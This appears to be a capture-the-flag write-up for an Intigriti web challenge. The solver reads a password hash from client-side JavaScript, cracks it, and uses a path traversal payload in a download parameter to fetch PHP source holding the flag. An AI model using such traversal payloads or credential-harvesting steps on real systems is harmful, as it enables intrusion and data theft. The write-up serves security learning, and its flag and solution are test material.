After a **dirbscan** I find `robots.txt` and I see:

```
/secret_172346606e1d24062e891d537e917a90.html
```

This leads me to a login page. In the source code I find:

```javascript
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```

I use **Crackstation** on the hash and get:

```
intel420
```

I log in and land on a portal with 4 images that i can download.

I test the query used for downloading images and manage to download the PHP script using:

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=%2Fassets%2Fimages%2F../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

Inside I find:

```
flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
```

✅ **Flag:** `INTIGRITI{70p_53cr37_m15510n_c0mpl373}`